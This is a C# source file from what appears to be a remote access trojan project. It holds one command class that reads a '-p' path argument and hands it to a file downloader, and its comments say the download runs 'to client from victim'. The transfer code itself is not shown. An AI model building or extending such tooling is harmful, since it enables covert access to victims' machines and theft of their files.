using RAT.src.Interfaces;
using System;
using System.Linq;

namespace RAT.src.Logic.RatCommands.Commands
{
    /// <summary>
    /// Command pattern for file download.
    /// </summary>
    public class DownloadFileCommand : IDownloadFileCommand
    {
        private readonly IFileDownloader _fileDownloader;
        private readonly IClientNotificationLogic _notificationLogic;
        private readonly IRatCommandInterpreter _commandInterpreter;

        /// <summary>
        /// Command pattern for file download.
        /// </summary>
        /// <param name="fileDownloader">Logic for file downloading (to client from victim).</param>
        /// <param name="notificationLogic">Logic for notifying user.</param>
        /// <param name="commandInterpreter">User commands interpreter.</param>
        public DownloadFileCommand(
            IFileDownloader fileDownloader,
            IRatCommandInterpreter commandInterpreter,
            IClientNotificationLogic notificationLogic)
        {
            _fileDownloader = fileDownloader;
            _notificationLogic = notificationLogic;
            _commandInterpreter = commandInterpreter;
        }

        /// <summary>
        /// Gives ability to execute command.
        /// </summary>
        /// <param name="command">Command with arguments which will be processed.</param>
        public void Execute(string command)
        {
            var args = _commandInterpreter.GetArgumentsForCommand(command);
            int indexOfPath = Array.IndexOf(args, "-p");
            if (indexOfPath == -1 || args.ElementAtOrDefault(indexOfPath + 1) == null)
            {
                _notificationLogic.NotifyClient($"\"-p\" (path) not found for RAT command\n");
                return;
            }

            // Passing value after "-p" argument, which should be path.
            _fileDownloader.DownloadFile(args[indexOfPath + 1]);
        }

        /// <summary>
        /// Gives ability to abort command.
        /// </summary>
        public void Abort() { }
    }
}